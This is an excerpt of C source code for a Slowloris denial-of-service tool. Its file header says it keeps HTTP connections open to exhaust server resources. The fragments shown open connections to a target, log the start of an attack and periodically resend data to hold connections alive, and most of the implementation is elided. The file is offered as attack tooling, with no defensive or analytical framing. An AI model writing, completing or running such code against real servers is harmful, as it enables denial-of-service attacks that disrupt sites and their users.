/**
 * @file slowloris.c
 * @brief Slowloris attack - Keep HTTP connections open and server resources exhausted
 * 
...
static int slowloris_create_connection(slowloris_context_t *ctx) {
    ...
    int result = connect(sock, (struct sockaddr *)&ctx->target, 
                        sizeof(ctx->target));
...
void *attack_slowloris(void *arg) {
    ...
    log_info("Starting Slowloris attack on %s:%d",
    ...
    while (ctx.running) {
        ...
        for (int i = 0; i < nfds; i++) {
            ...
            if (conn->connected && (now - conn->last_send) >= SLOWLORIS_SEND_INTERVAL) {
